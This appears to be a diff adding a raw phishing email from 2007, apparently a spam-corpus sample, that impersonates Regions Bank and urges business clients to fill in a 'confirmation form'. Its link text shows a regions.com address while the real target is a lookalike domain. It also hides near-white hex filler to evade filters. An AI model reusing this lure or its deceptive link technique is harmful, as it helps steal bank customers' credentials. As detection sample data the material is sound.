@@ -1,0 +1,65 @@
+From nobody Sun Jan 25 13:49:58 2015
+Return-Path: <clientcare.ref00705774953.cm@regions.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id BCA6A2A899
+ for <user@example.com>; Fri, 29 Jun 2007 04:34:03 -0400 (EDT)
+Received: from mail.example.com (mail.example.com [192.168.1.2])
+ by mail.example.com (Example mail relay) with ESMTP id 6DEDC621C9C
+ for <user@example.com>; Fri, 29 Jun 2007 04:34:03 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 24E221624C; Fri, 29 Jun 2007 04:36:29 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from host178-26-dynamic.3-79-r.retail.telecomitalia.it
+ (host178-26-dynamic.3-79-r.retail.telecomitalia.it [79.3.26.178])
+ by mail.example.com (Example mail relay) with SMTP id 92A5F16244
+ for <user@example.com>; Fri, 29 Jun 2007 04:34:55 -0400 (EDT)
+Received: from hotbox.com (lens.hotbox.com [104.120.5.40])
+ by pacbell.net with SMTP id ETIGJYTAQ8
+ for <user@example.com>; Fri, 29 Jun 2007 01:32:23 -0800
+From: "Regions Bank" <clientcare.ref00705774953.cm@regions.com>
+To: user <user@example.com>
+X-Authentication-Warning: H36-henry00.UL3ycw.invisioweb.com (helo
+ cimdesign.com.rnktech.com [22.96.96.52]): cx643jo set sender to
+ service.refxv5027305753pg.cm@regions.com using -t
+Subject: Regions Bank Corporate Customer Service: Confirm Your Account
+ Records! (message id: B34265387720840)
+User-Agent: Calypso Version 3.30.00.00
+X-Mailer: Calypso Version 3.30.00.00
+X-Priority: 3 (Normal)
+MIME-Version: 1.0
+Content-Type: multipart/alternative;
+	boundary="--NR2FQEYK73IL8C0"
+Message-Id: <20070629083503.92A5F16244@mail.example.com>
+Date: Fri, 29 Jun 2007 04:34:55 -0400 (EDT)
+X-Keywords: 
+Status: O
+Content-Length: 3562
+Lines: 26
+
+----NR2FQEYK73IL8C0
+Content-Type: text/html;
+Content-Transfer-Encoding: 7Bit
+
+<head>
+<meta  http-equiv="Content-Type"   content="text/html;   charset=iso-8859-1"       />
+</head>
+
+<body>
+<p><font     face="Arial">Dear   business    client      of     <b>Regions  Bank</b>:</font></p>
+<p><font  face="Arial">The    Regions Customer       Service      requests      you      to      complete      the   Regions      InterAct      Confirmation     Form.</font></p>
+<p><font    face="Arial">This procedure    is      obligatory      for       all   business      and    corporate   clients of Regions   Bank.</font></p>
+<p><font       face="Arial">Please      select    the    hyperlink and   visit    the      address      listed   to  access   the  Regions  InterAct       Confirmation  Form.</font><br>
+</p><p><font    face="Arial"><a    href="http://interactsession-404672.regions.com.iusermol.ph/ibsregions/cmserver/iform.cfm">http://interactsession-404672.regions.com/ibsregions/cmserver/iform.cfm</a></font></p>
+<p><font   face="Arial">Again,       thank     you for       choosing      Regions   Bank    for your     business needs. We     look    forward    to  working with     you.</font></p>
+<p><font    face="Arial">*****       Please       do   not respond    to  this       email      *****</font></p><p><font  face="Arial">This       mail  is       generated   by       an automated      service.<br>
+Replies     to      this  mail      are not  read  by   Regions      Bank   customer service    or   technical    support.</font><br></p>
+<p>=</p>
+<p><font      color="#FFFFF8"   face="Arial">start: 0x365, 0x68, 0x4466, 0x47, 0x781, 0x8613, 0x7733, 0x4989, 0x79, 0x7, 0x5, 0x30003817, 0x0670, 0x16028188     interface, CEG, XJK. L1VD: 0x5, 0x3       QIH: 0x27291160, 0x56233009, 0x8249, 0x2, 0x06141002, 0x994, 0x606  0x3683, 0x729, 0x4660, 0x95604265, 0x06807701, 0x3724 source: 0x9982, 0x98834551, 0x2, 0x7707, 0x89230289, 0x3, 0x09, 0x50909946  create: 0x9, 0x14, 0x865, 0x6, 0x70, 0x90, 0x14061792, 0x896, 0x358, 0x0, 0x3841 0x7277, 0x13902383, 0x7860, 0x954, 0x574, 0x52, 0x61421394, 0x6876, 0x5, 0x516, 0x2428, 0x66, 0x033, 0x111, 0x16108797   revision: 0x7, 0x69, 0x76805984, 0x10, 0x294, 0x34, 0x5864</font></p><p><font    color="#FFFFF2" face="Arial"><span>exe: 0x0593, 0x8, 0x6664, 0x6, 0x38025019, 0x48, 0x71450916, 0x46460690, 0x215, 0x20, 0x10, 0x29963000, 0x3, 0x415, 0x2460     0x6, 0x37171236, 0x287, 0x6, 0x09, 0x50628515 common: 0x9, 0x397, 0x72, 0x67     serv hex 2BI 8LB A5B api  rev: 0x67, 0x3436, 0x38840756, 0x33, 
+ 0x16132059    0x14284207, 0x77, 0x58, 0x2887, 0x37462133, 0x13     </span><span>function dec TEZ 5SRI create    0x0458, 0x36988054, 0x86, 0x88, 0x1, 0x8011, 0x42129290, 0x8276, 0x0, 0x0599, 0x979    hex: 0x53907246, 0x5, 0x8, 0x0974, 0x92101783, 0x24397013, 0x21, 0x854, 0x88186287, 0x641, 0x72, 0x89, 0x62, 0x396, 0x20722916       engine: 0x36923996, 0x940, 0x6, 0x0946, 0x55410217, 0x2154, 0x9, 0x3</span></font></p>
+<p><font       color="#FFFFF1"     face="Arial"><span>0x7443    0x2, 0x90, 0x04794150, 0x57367299, 0x9191, 0x625, 0x005, 0x07, 0x34586567, 0x020, 0x265, 0x5, 0x396  rcs: 0x79       GTH: 0x170, 0x863, 0x2, 0x28, 0x188, 0x504     RT3W include update serv 00T ZHU CIC</span><span>0x32, 0x284, 0x0792, 0x772, 0x42, 0x29215929, 0x23, 0x06       </span><span>0x59, 0x85199990, 0x0517   update: 0x10008802, 0x5, 0x518, 0x010, 0x54, 0x127, 0x2, 0x23, 0x9, 0x4124, 0x980, 0x48   DY1 define common ZIP5 file rcs file DD60   engine: 0x87211862</span></font></p>
+</body>
+</html>
+
+
+----NR2FQEYK73IL8C0--
